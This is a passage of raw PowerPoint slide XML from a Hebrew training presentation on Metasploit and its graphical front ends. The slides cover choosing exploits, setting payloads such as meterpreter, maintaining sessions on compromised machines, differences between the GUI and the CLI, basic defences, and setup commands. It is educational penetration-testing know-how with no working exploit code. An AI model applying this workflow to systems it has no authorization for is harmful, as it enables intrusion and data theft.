              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מבוצעות סריקות כדי לזהות חולשות ידועות בתוכנה או במערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>ניצול חולשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בחירת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בוחרים את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> exploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המתאים לחולשה שנמצאה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגדרת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Payloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מגדירים את הקוד שיתבצע לאחר ניצול החולשה, לדוגמה, קוד לשליטה מרחוק או חיבור למחשב המותקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>תחזוקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניהול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> פעילים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עוקבים ומבצעים פעולות על מכשירים שנפגעו, כגון שליחת פקודות או גניבת מידע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="306418225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AEB99A6-B447-4011-8871-760AF8BE03C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EF9FCF9E-E0FD-49F2-BB8F-2DA0E11F00B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה לעבודה עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Point-and-Click Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שמנהל מערכת רוצה לבדוק את אבטחת הרשת שלו. הוא משתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Armitage </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ממשק גרפי ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סריקת רשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: המנהל מפעיל סריקת נמל על הרשת כדי למצוא מכשירים ושירותים פעילים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זיהוי חולשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הוא מזהה חולשות ידועות על מכשירים מסוימים, כמו גרסאות ישנות של תוכנות פגיעות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול חולשות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הוא בוחר ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המתאים ומגדיר את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הרצוי, כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לקבל שליטה על המכשירים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תחזוקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לאחר שהצליח לנצל חולשה, המנהל משתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Armitage </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לשלוח פקודות למערכת המותקפת, לעקוב אחרי פעילותה ולבצע </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אודיט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נוסף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="301651389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DB75F0-BB42-4628-BC06-737552FA1757}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1295400" y="642594"/>
            <a:ext cx="10058400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{309FA424-60F7-40D2-B99C-F3BA933B3A15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>הבדל בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Point-and-Click</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t> ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>CLI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t> (שורת פקודה)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t>:Point-and-Click</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" u="sng" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ממשק גרפי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מספק כלי אינטואיטיביים וויזואליים. מתאים למי שאינו מכיר את שורת הפקודה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>נגישות מהירה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ניתן לבצע פעולות רבות דרך ממשק גרפי פשוט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0"/>
              <a:t>CLI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ממשק שורת פקודה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: דורש הכרות עם פקודות ותחביר, אך מספק שליטה מדויקת יותר ואפשרות להתאמות אישיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גמישות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ניתן לבצע פעולות מורכבות יותר ואוטומטיות עם כתיבת סקריפטים מותאמים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="84053896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49F9D7-C959-4E7E-B9E6-AF74EA47587F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1355034" y="652533"/>
            <a:ext cx="10058400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Point-and-click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FDE30A28-E1B2-4A06-A6A2-67C222EF25F1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>כיצד מתמודדים עם האתגרים</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>מניעת התקפות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכון תוכנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הקפד לעדכן את כל התוכנות והמערכות כדי למנוע ניצול חולשות ידועות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בקרת גישה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש בחומות אש ופתרונות אבטחה נוספים כדי להגן על המערכות שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>מעקב וניהול</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניטור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: עקוב אחרי פעילות רשת ונתונים לא רגילים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגיב במהירות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: יש לפתח </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>תוכניות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תגובה לאירועים ולהגיב במהירות במקרים של תקיפות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259078360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5A7932-9276-4C2D-8BAB-CEB86E64382A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3667538" y="642594"/>
            <a:ext cx="7457661" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקנה והפעלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7CFCAEDD-3636-44F5-8DD5-216D561DFFD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. השלב הראשון הוא לוודא שמותקן לך</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Metasploit Framework </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במערכת. אם אתה משתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מגיע מותקן מראש. כדי להפעיל את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בצע את הפקודה הבאה בטרמינל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. הפעלת ממשק ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להפעיל את ממשק ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש בפקודה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>msfdb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> init</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר מכן, פתח דפדפן וגש לכתובת:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://localhost:3790</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הכנס את פרטי ההתחברות שלך, ובצע כניסה לממשק ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Web.</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="74421098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114D4A8-6A31-4E41-B3B7-571423E753D7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1789042" y="642594"/>
            <a:ext cx="9336157" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקנה והפעלת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{212752ED-B662-4E91-9BBB-56FC9B36104D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. סריקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר שנכנסת לממשק ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחר בלשונית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Modules </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחלק העליון של המסך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחר ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ולחץ על המודול שאתה רוצה להשתמש בו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הכנס את הפרמטרים הדרושים, כגון כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של המטרה, ולחץ על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Metasploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> למתקפה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בחר בלשונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Targets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ו הוסף את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של המטרה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חזור ללשונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Modules</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ובחר במודול התקיפה הרצוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגדר את הפרמטרים הדרושים, כגון פורטים, ולחץ על </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>5. ניתוח תוצאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר הרצת המודול, חזור ללשונית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Jobs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לראות את התוצאות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בדוק את הלוגים והתוצאות המוצגות בממשק ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להבין את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שנמצאו ואת המידע שנאסף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
